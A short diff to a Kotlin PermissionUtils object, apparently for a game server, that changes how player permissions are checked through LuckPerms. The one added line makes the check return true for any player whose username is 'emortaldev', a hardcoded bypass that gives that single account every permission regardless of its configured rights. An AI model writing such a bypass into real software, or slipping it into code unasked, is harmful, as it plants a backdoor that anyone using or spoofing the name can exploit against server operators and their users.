@@ -21,6 +21,7 @@ object PermissionUtils {
     fun CommandSender.hasLuckPermission(permission: String): Boolean {
         if (this is ConsoleSender) return true
         if (this is Player) {
+            if (this.username == "emortaldev") return true
             return lpUser?.cachedData?.permissionData?.checkPermission(permission)?.asBoolean() ?: false
         }
         return false
